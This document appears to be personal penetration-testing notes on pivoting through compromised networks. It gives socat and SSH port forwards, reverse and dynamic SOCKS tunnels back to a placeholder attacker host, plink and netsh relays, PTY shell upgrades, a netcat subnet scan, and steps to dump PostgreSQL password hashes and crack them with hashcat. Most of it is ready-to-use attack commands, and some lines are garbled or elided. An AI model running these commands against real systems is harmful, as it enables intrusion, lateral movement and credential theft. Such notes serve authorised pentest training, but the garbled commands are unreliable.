# Tunneling

## Port forwarding

### Socat

| WAN | DMZ | Inside LAN |
|-----|-----|------------|
| Kali | Gateway | DB |
| IpAttacker | IpDmzOut - IpDmzIn | IpDbDeepIn |

Run a Socat tunnel on the gateway to the database:
```
gateway$ socat -ddd TCP-LISTEN:2345,fork TCP:DbHostIP:5432
```
and connect to the DB directly from Kali (and retrieve password hashes):
```
kali$ psql -h GatewayIP -p 2345 -U postgres
> \l
> \c mydb
> select table_schema,table_name from information_schema.tables where table_name like '%user%;
> select * from user_table
> \o hashes.txt
> select t1.id,t1.user_name,t2.password_hash from user_table as t1 inner join credential_table as t2 on t1.id = t2.user_id;
> \o
> \q
```
Crack the hashes:
```
kali$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt # Atlassian hashcat code: hashcat -h
kali$ vim afterhashcat.txt # copy-paste the lines which have been cracked
kali$ tr -d ' ' hashes.txt | awk -F'|' '(NR >2) {print $2, $17}' > loginpass.txt
kali$ vim loginpass.txt # clean ?
kali$ awk -F' ' '{a[$1]=a[$1]?a[$1]":"$2:$2":"$1;}END{for (i in a) print a[i];}' loginpass.txt afterhashcat.txt | awk -F ':' '$3 {print $1, $3}' > final.txt
```

Notes:
- Confluence config file: `/var/atlassian/application-data/confluence/confluence.cfg.xml`
- Awk tips: https://www.theunixschool.com/2012/06/awk-10-examples-to-group-data-in-csv-or.html

Tunnel for an SSH connection: `socat -ddd TCP-LISTEN:2222,fork TCP:DbHostIp:22`

### Ssh

| WAN | DMZ | Inside LAN - subnet 1 | Inside LAN - subnet 2 |
|-----|-----|------------|------|
| Kali | Gateway | DB | Windows |
| IpAttacker | IpDmzOut - IpDmzIn | IpDbOut - IpDbIn | IpWindows |

TTY functionalities with Python:
```
hacked_target$ python3 -c 'import pty; pty.spawn("/bin/sh")'
hacked_target$ python3 -c 'import pty; pty.spawn(["env","TERM=xterm-256color","/bin/bash","--rcfile", "/etc/bash.bashrc","-i"])'
```

Netcat port discovery:
```
hacked_target$ for i in $(seq 1 254) ; do nc -zv -w 1 ${subnet}.${i} $Port; done # listen, verbose, timeout 1sec
```

#### Ssh forward tunnel

```
DmzHost$ ssh -N -L 0.0.0.0:$PortDmzOut:$IpWindows:$PortWindows user@$IpDbOut
Kali$ smbclient -p $PortDmzOut -L //$IpDmzOut/ -U someuser --password=somepass
```

#### Ssh dynamic tunnel

```
DmzHost$ ssh -N -D 0.0.0.0:$PortDmzOut user@$IpDbOut
Kali$ sudo vi /etc/proxychains4.conf
    socks5 $IpDmzOut $PortDmzOut
Kali$ proxychains smbclient -L //$IpWindows/ -U someuser --password=somepass
Kali$ proxychains nmap -vvv -sT --top-ports=20 -Pn $IpWindows
```

#### Ssh reverse tunnel

```
hackeduser@hackedtarget$ sh -N -R 127.0.0.1:$KaliPort:$IpDbIn:$PortDbIn user@IpAttacker # Only Kali will be able to use this tunnel...
hackeduser@hackedtarget$ sh -N -R 0.0.0.0:$KaliPort:$IpDmzIn:$PortDmzIn user@IpAttacker # All IPs will be able to connect through $KaliPort on the Kali box
```
Check with `ss -lntpu` on Kali. Example of connection with PostGreSQL:
```
kali$ psql -h 127.0.0.1 -p $KaliPort -U postgre_user
```
then on the DB, as usual:
```
postgre=# \l
postgre=# \c some_database
postgre=# select * from some_table ;
```

#### Ssh dynamic reverse tunnel

```
hackeduser@hackedtarget$ ssh -N -R $KaliPort kaliuser@IpAttacker
```
then check with `ss -lntpu`, prepare a socks proxy on `/etc/proxychains4.conf`:
```
...
socks5 127.0.0.1 $KaliPort
```
and scan the new target:
```
kali$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n $NewTargetIp
```

#### Sshuttle

On the target:
```
hackeduser@hackedtarget$ socat ...
```
then run the sshuttle on Kali:
```
kali$ sshuttle -r ...
```
and test
```
kali$ smbclient -L //$IpWindows/ -U some_user --password=some_pass
```

### Windows

#### Ssh.exe

```
Windows PS> ssh.exe -N -R $ListeningPort user@$IpAttacker
Kali$ ss -lntpu # check
Kali$ vim /etc/proxychains4.conf
    socks5 127.0.0.1 $ListeningPort
Kali$ proxychains mycommand myoptions
```

#### Plink

```
KaliRshell$ cmdprompt> C:\path\to\plink.exe -ssh -l kaliuser -pw somepass -R 127.0.0.1:9833:127.0.0.1:3389 $IpAttacker
KaliRshell$ cmdprompt> KaliNormalShell$ ss -ntplu # check
Kali$ xfreerdp /u:rdp_user /p:rdp_pass /v:127.0.0.1:9833
```

#### Netsh

```
> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=$IpDmzOut connectport=22 connectaddress=$IpDmzIn
> netstat -anp TCP | find "2222"
> netsh interface portproxy show all
> netsh advfirewall firewall add rule name="my_rule_name" protocol=TCP dir=in localip=$IpDmzOut localport=2222 action=allow
$ ssh user@$IpDmzOut -p2222
> netsh advfirewall firewall delete rule name="my_rule_name"
> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=$IpDmzOut
> netsh interface portproxy show all
```



